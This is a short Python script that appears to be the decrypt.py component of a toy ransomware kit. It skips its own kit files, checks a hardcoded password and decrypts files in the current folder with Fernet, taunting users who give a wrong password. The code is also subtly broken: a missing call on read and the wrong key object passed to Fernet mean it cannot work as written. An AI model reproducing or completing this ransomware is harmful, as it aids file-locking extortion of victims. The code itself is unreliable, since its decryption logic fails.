x = input("this ransomware is only to be executed on test machines not on your real machine. proceed?(y/n)")
if x != "y":
    quit()
else:
    print("proceeding with execution...")

#real code starts here

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "sysfile.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#cryptography key

with open("sysfile.key" , "rb") as key:
    secretkey =key.read()

password = "password"
passwordbox = input("Enter password to decrypt \n")

if passwordbox == password:
    for file in files:
        with open(file , "rb") as stuff:
            contents = stuff.read
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file , "wb") as stuff:
            stuff.write(contents_decrypted)
            print("files successfully decrypted , good job peasant")
else:
    print("wrong password ahahahahahahhaahhaahahahahah!!!")
